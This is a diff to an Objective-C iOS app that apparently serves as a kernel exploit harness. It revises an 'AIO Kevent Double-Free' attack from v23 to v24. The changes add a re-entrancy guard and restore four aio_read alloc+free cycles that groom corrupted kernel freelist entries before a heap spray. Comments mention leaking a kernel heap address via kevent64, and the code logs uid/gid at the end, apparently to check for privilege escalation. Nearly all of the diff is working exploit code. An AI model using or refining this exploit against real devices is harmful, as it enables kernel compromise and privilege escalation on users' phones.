@@ -5723,17 +5723,26 @@ static void *e2_free_and_ool_racer(void *arg) {
 // Leaks kernel heap address via kevent64 ident field.
 
 - (void)aioUafTapped {
+    // v24: Strong re-entrancy guard — @synchronized only wraps debounce,
+    // but static flag prevents any possibility of concurrent execution.
+    static volatile int32_t _aioRunning = 0;
+    if (!__sync_bool_compare_and_swap(&_aioRunning, 0, 1)) {
+        [self appendLog:@"⚠ Already running — rejecting re-entrant call"];
+        return;
+    }
+
     @synchronized([ViewController class]) {
         static int64_t _aioLast = 0;
         int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
         if (now - _aioLast < 3000) {
+            _aioRunning = 0;
             [self appendLog:@"⚠ Debounced"];
             return;
         }
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v23 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v24 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5884,9 +5893,31 @@ static void *e2_free_and_ool_racer(void *arg) {
         }
     }
 
-    // v22: SKIP health check — don't insert 4 entries between Y's two copies.
-    // In v20 the health check alloc+free pushed Y's copies apart, preventing overlap.
-    // AIO subsystem health was already confirmed working in v10-v20.
+    // v24: RESTORE health check — v20 was the only version that didn't crash.
+    // The 4 alloc+free cycles consume corrupted freelist entries and give the
+    // kernel worker threads time to finish AIO cleanup before Phase D.
+    // Skipping this in v21-v23 caused ALL versions to crash identically.
+    [self appendLog:@"\n--- Health check (v20 restore) ---"];
+    {
+        struct aiocb hc[4];
+        char hcbuf[4][256];
+        int hc_ok = 0;
+        for (int i = 0; i < 4; i++) {
+            memset(&hc[i], 0, sizeof(hc[i]));
+            hc[i].aio_fildes = fd;
+            hc[i].aio_buf = hcbuf[i];
+            hc[i].aio_nbytes = 1;
+            hc[i].aio_offset = 0;
+            hc[i].aio_lio_opcode = LIO_READ;
+            hc[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+            if (aio_read(&hc[i]) == 0) {
+                while (aio_error(&hc[i]) == EINPROGRESS) usleep(100);
+                aio_return(&hc[i]);
+                hc_ok++;
+            }
+        }
+        [self appendLog:[NSString stringWithFormat:@"  health check: %d/4 ok", hc_ok]];
+    }
 
     // ---- v22: 20x OOL spray (NO drain) + FORWARD cleanup ----
     // Forward Phase A cleanup fixes the v21 crash (dangling knote in close(kq)).
@@ -6018,6 +6049,8 @@ static void *e2_free_and_ool_racer(void *arg) {
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
     [self appendLog:@"========== AIO Kevent Double-Free Complete =========="];
+            // v24: Reset re-entrancy guard
+            _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
                 [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
